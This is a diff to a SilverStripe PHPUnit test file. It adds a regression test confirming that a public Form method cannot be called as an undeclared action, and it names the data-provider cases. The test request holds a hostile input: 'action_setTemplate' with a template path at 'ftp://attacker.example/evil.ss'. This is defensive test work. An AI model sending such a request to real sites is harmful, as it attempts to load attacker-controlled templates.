@@ -5,6 +5,7 @@ namespace SilverStripe\Forms\Tests;
 use PHPUnit\Framework\Attributes\DataProvider;
 use SilverStripe\Control\Controller;
 use SilverStripe\Control\HTTPRequest;
+use SilverStripe\Control\HTTPResponse_Exception;
 use SilverStripe\Control\Session;
 use SilverStripe\Dev\SapphireTest;
 use SilverStripe\Forms\CompositeField;
@@ -112,19 +113,43 @@ class FormRequestHandlerTest extends SapphireTest
         $this->assertSame($expectedData, array_intersect_key($data, ['Password' => true, 'StateID' => true]));
     }
 
+    public function testDoesNotDispatchToNonActionFormMethod()
+    {
+        // Regression test for a public Form method being callable as an action without being a declared action
+        $form = new TestForm(
+            Controller::curr(),
+            'Form',
+            new FieldList(),
+            new FieldList(new FormAction('mySubmitOnForm'))
+        );
+        $form->disableSecurityToken();
+        $handler = new FormRequestHandler($form);
+        $request = new HTTPRequest('POST', '/', null, [
+            'action_setTemplate' => 1,
+            'MaliciousTemplate' => 'ftp://attacker.example/evil.ss',
+        ]);
+        $request->setSession(new Session([]));
+        try {
+            $handler->httpSubmission($request);
+        } catch (HTTPResponse_Exception $e) {
+            $this->assertEquals(403, $e->getResponse()->getStatusCode());
+        }
+        $this->assertNull($form->getTemplate());
+    }
+
     public static function provideHandleField(): array
     {
         return [
-            [
+            'data field at top level' => [
                 'fieldToRequest' => 'FieldOne',
             ],
-            [
+            'data field inside a composite' => [
                 'fieldToRequest' => 'FieldTwo',
             ],
-            [
+            'field managed by a child field manager' => [
                 'fieldToRequest' => 'FieldThree',
             ],
-            [
+            'field that does not exist' => [
                 'fieldToRequest' => 'NonExistantField',
             ],
         ];
